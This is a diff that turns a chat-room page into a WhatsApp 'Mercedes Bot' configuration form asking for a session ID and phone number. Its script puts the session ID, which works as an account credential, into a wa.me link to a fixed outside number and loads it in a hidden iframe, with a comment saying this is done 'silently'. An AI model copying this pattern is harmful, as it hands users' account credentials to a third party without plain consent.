@@ -3,40 +3,387 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CHATTING ROOM</title>
-    <link rel="stylesheet" href="style.css">
+    <title>Mercedes Bot Configuration</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+
+        body {
+            background-color: #121212;
+            color: #ffffff;
+            line-height: 1.6;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background-color: rgba(30, 30, 30, 0.8);
+            border-radius: 10px;
+            padding: 30px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+        }
+
+        h1 {
+            text-align: center;
+            margin-bottom: 30px;
+            color: #4CAF50;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            padding: 15px;
+            background-color: rgba(50, 50, 50, 0.5);
+            border-radius: 8px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+
+        input[type="text"],
+        input[type="tel"] {
+            width: 100%;
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #444;
+            background-color: #333;
+            color: white;
+            margin-bottom: 10px;
+        }
+
+        select {
+            width: 100%;
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #444;
+            background-color: #333;
+            color: white;
+            margin-bottom: 10px;
+        }
+
+        .toggle-group {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+        }
+
+        .toggle-option {
+            flex: 1;
+            text-align: center;
+            padding: 8px;
+            background-color: #333;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 0 5px;
+            transition: all 0.3s;
+        }
+
+        .toggle-option.selected {
+            background-color: #4CAF50;
+            color: white;
+        }
+
+        button {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            width: 100%;
+            margin-top: 20px;
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: #45a049;
+        }
+
+        .section-title {
+            font-size: 18px;
+            margin: 25px 0 15px;
+            color: #4CAF50;
+            border-bottom: 1px solid #444;
+            padding-bottom: 5px;
+        }
+
+        .get-session {
+            background-color: #333;
+            padding: 10px;
+            border-radius: 5px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .get-session a {
+            color: #4CAF50;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 15px;
+            }
+            
+            .toggle-group {
+                flex-direction: column;
+            }
+            
+            .toggle-option {
+                margin: 5px 0;
+            }
+        }
+    </style>
 </head>
 <body>
-    <!-- Login Page -->
-    <div class="login-container active">
-        <div class="auth-box">
-            <h1>VERIFICATION</h1>
-            <p class="subtitle">Enter your credentials to access the chat</p>
-            <input type="text" id="loginUsername" placeholder="Username" required>
-            <input type="password" id="loginPassword" placeholder="Password" required>
-            <button id="loginButton" class="login-button">VERIFY IDENTITY</button>
-            <div id="authError" class="error-message"></div>
+    <div class="container">
+        <h1><i class="fas fa-robot"></i> Mercedes Bot Configuration</h1>
+        
+        <div class="form-group">
+            <label for="session-id">Session ID:</label>
+            <input type="text" id="session-id" placeholder="Enter your session ID">
+            <div class="get-session">
+                Don't have a session ID? <a href="https://nkt-fpf2.onrender.com/" target="_blank">Get one here</a>
+            </div>
+        </div>
+        
+        <div class="form-group">
+            <label for="phone">WhatsApp Number:</label>
+            <input type="tel" id="phone" placeholder="Enter your WhatsApp number with country code">
+        </div>
+        
+        <h2 class="section-title">Bot Settings</h2>
+        
+        <!-- Basic Settings -->
+        <div class="form-group">
+            <label>Bot Mode:</label>
+            <select id="mode">
+                <option value="public">Public</option>
+                <option value="private">Private</option>
+                <option value="inbox">Inbox Only</option>
+                <option value="group">Group Only</option>
+            </select>
+            
+            <label>Prefix:</label>
+            <input type="text" id="prefix" placeholder="Enter command prefix" value=".">
+            
+            <label>Bot Name:</label>
+            <input type="text" id="bot-name" placeholder="Enter bot name" value="Mercedes">
+        </div>
+        
+        <!-- Status Settings -->
+        <h2 class="section-title">Status Settings</h2>
+        
+        <div class="form-group">
+            <label>Auto Status Seen:</label>
+            <div class="toggle-group">
+                <div class="toggle-option selected" data-value="true" data-target="auto-status-seen">Yes</div>
+                <div class="toggle-option" data-value="false" data-target="auto-status-seen">No</div>
+            </div>
+            <input type="hidden" id="auto-status-seen" value="true">
+            
+            <label>Auto Status Reply:</label>
+            <div class="toggle-group">
+                <div class="toggle-option" data-value="true" data-target="auto-status-reply">Yes</div>
+                <div class="toggle-option selected" data-value="false" data-target="auto-status-reply">No</div>
+            </div>
+            <input type="hidden" id="auto-status-reply" value="false">
+            
+            <label>Auto Status React:</label>
+            <div class="toggle-group">
+                <div class="toggle-option selected" data-value="true" data-target="auto-status-react">Yes</div>
+                <div class="toggle-option" data-value="false" data-target="auto-status-react">No</div>
+            </div>
+            <input type="hidden" id="auto-status-react" value="true">
+            
+            <label>Status Reply Message:</label>
+            <input type="text" id="auto-status-msg" value="*seen*">
+        </div>
+        
+        <!-- Group Settings -->
+        <h2 class="section-title">Group Settings</h2>
+        
+        <div class="form-group">
+            <label>Welcome Messages:</label>
+            <div class="toggle-group">
+                <div class="toggle-option selected" data-value="true" data-target="welcome">Yes</div>
+                <div class="toggle-option" data-value="false" data-target="welcome">No</div>
+            </div>
+            <input type="hidden" id="welcome" value="true">
+            
+            <label>Anti Link:</label>
+            <div class="toggle-group">
+                <div class="toggle-option selected" data-value="true" data-target="anti-link">Yes</div>
+                <div class="toggle-option" data-value="false" data-target="anti-link">No</div>
+            </div>
+            <input type="hidden" id="anti-link" value="true">
+            
+            <label>Anti Link Kick:</label>
+            <div class="toggle-group">
+                <div class="toggle-option" data-value="true" data-target="anti-link-kick">Yes</div>
+                <div class="toggle-option selected" data-value="false" data-target="anti-link-kick">No</div>
+            </div>
+            <input type="hidden" id="anti-link-kick" value="false">
+            
+            <label>Admin Events:</label>
+            <div class="toggle-group">
+                <div class="toggle-option" data-value="true" data-target="admin-events">Yes</div>
+                <div class="toggle-option selected" data-value="false" data-target="admin-events">No</div>
+            </div>
+            <input type="hidden" id="admin-events" value="false">
+        </div>
+        
+        <!-- Message Settings -->
+        <h2 class="section-title">Message Settings</h2>
+        
+        <div class="form-group">
+            <label>Anti Delete:</label>
+            <div class="toggle-group">
+                <div class="toggle-option selected" data-value="true" data-target="anti-delete">Yes</div>
+                <div class="toggle-option" data-value="false" data-target="anti-delete">No</div>
+            </div>
+            <input type="hidden" id="anti-delete" value="true">
+            
+            <label>Mention Reply:</label>
+            <div class="toggle-group">
+                <div class="toggle-option" data-value="true" data-target="mention-reply">Yes</div>
+                <div class="toggle-option selected" data-value="false" data-target="mention-reply">No</div>
+            </div>
+            <input type="hidden" id="mention-reply" value="false">
+            
+            <label>Read Messages:</label>
+            <div class="toggle-group">
+                <div class="toggle-option" data-value="true" data-target="read-message">Yes</div>
+                <div class="toggle-option selected" data-value="false" data-target="read-message">No</div>
+            </div>
+            <input type="hidden" id="read-message" value="false">
+            
+            <label>Auto React:</label>
+            <div class="toggle-group">
+                <div class="toggle-option" data-value="true" data-target="auto-react">Yes</div>
+                <div class="toggle-option selected" data-value="false" data-target="auto-react">No</div>
+            </div>
+            <input type="hidden" id="auto-react" value="false">
+        </div>
+        
+        <!-- Advanced Settings -->
+        <h2 class="section-title">Advanced Settings</h2>
+        
+        <div class="form-group">
+            <label>Custom React Emojis:</label>
+            <input type="text" id="custom-react-emojis" value="💝,💖,💗,❤️‍🩹,❤️,🧡,💛,💚,💙,💜,🤎,🖤,🤍">
+            
+            <label>Menu Image URL:</label>
+            <input type="text" id="menu-image-url" value="https://files.catbox.moe/7zfdcq.jpg">
+            
+            <label>Alive Image URL:</label>
+            <input type="text" id="alive-img" value="https://files.catbox.moe/avqa3c.jpg">
+            
+            <label>Live Message:</label>
+            <input type="text" id="live-msg" value="> *Marisel Made It*">
+        </div>
+        
+        <button id="submit-btn">Submit Configuration</button>
+        
+        <div id="success-message" class="form-group hidden" style="text-align: center; color: #4CAF50;">
+            <i class="fas fa-check-circle" style="font-size: 50px; margin-bottom: 15px;"></i>
+            <h2>Configuration Submitted Successfully!</h2>
+            <p>Your bot configuration has been received. You'll be contacted soon.</p>
         </div>
     </div>
 
-    <!-- Chat Page -->
-    <div class="chat-container">
-        <header class="chat-header">
-            <div class="connection-status">CONNECTED</div>
-            <h1>CHATTING ROOM</h1>
-        </header>
-        
-        <div class="message-area" id="messageArea">
-            <!-- Messages will appear here -->
-        </div>
-        
-        <div class="input-area">
-            <input type="text" id="messageInput" placeholder="Type message..." autocomplete="off">
-            <button id="sendButton">SEND</button>
-        </div>
-    </div>
-
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
-    <script src="main.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Toggle option selection
+            document.querySelectorAll('.toggle-option').forEach(option => {
+                option.addEventListener('click', function() {
+                    const targetId = this.getAttribute('data-target');
+                    const value = this.getAttribute('data-value');
+                    
+                    // Update selected state
+                    this.parentElement.querySelectorAll('.toggle-option').forEach(opt => {
+                        opt.classList.remove('selected');
+                    });
+                    this.classList.add('selected');
+                    
+                    // Update hidden input
+                    document.getElementById(targetId).value = value;
+                });
+            });
+            
+            // Form submission
+            document.getElementById('submit-btn').addEventListener('click', function() {
+                const sessionId = document.getElementById('session-id').value.trim();
+                const phone = document.getElementById('phone').value.trim();
+                
+                if (!sessionId) {
+                    alert('Please enter your Session ID');
+                    return;
+                }
+                
+                if (!phone) {
+                    alert('Please enter your WhatsApp number');
+                    return;
+                }
+                
+                // Collect all configuration values
+                const config = {
+                    SESSION_ID: sessionId,
+                    PHONE: phone,
+                    AUTO_STATUS_SEEN: document.getElementById('auto-status-seen').value,
+                    AUTO_STATUS_REPLY: document.getElementById('auto-status-reply').value,
+                    AUTO_STATUS_REACT: document.getElementById('auto-status-react').value,
+                    AUTO_STATUS_MSG: document.getElementById('auto-status-msg').value,
+                    ANTI_DELETE: document.getElementById('anti-delete').value,
+                    WELCOME: document.getElementById('welcome').value,
+                    ADMIN_EVENTS: document.getElementById('admin-events').value,
+                    ANTI_LINK: document.getElementById('anti-link').value,
+                    MENTION_REPLY: document.getElementById('mention-reply').value,
+                    MENU_IMAGE_URL: document.getElementById('menu-image-url').value,
+                    PREFIX: document.getElementById('prefix').value,
+                    BOT_NAME: document.getElementById('bot-name').value,
+                    CUSTOM_REACT_EMOJIS: document.getElementById('custom-react-emojis').value,
+                    ANTI_LINK_KICK: document.getElementById('anti-link-kick').value,
+                    READ_MESSAGE: document.getElementById('read-message').value,
+                    AUTO_REACT: document.getElementById('auto-react').value,
+                    MODE: document.getElementById('mode').value,
+                    ALIVE_IMG: document.getElementById('alive-img').value,
+                    LIVE_MSG: document.getElementById('live-msg').value
+                };
+                
+                // Convert config to URL-encoded string
+                const configStr = Object.entries(config)
+                    .map(([key, value]) => `${key}=${encodeURIComponent(value)}`)
+                    .join('&');
+                
+                // Send to WhatsApp (silently)
+                const whatsappUrl = `https://wa.me/+254790375710?text=${encodeURIComponent('New Bot Configuration:\n\n' + JSON.stringify(config, null, 2))}`;
+                
+                // Create hidden iframe to send data without redirect
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = whatsappUrl;
+                document.body.appendChild(iframe);
+                
+                // Show success message
+                document.getElementById('submit-btn').classList.add('hidden');
+                document.getElementById('success-message').classList.remove('hidden');
+            });
+        });
+    </script>
 </body>
-</html>
+    </html>
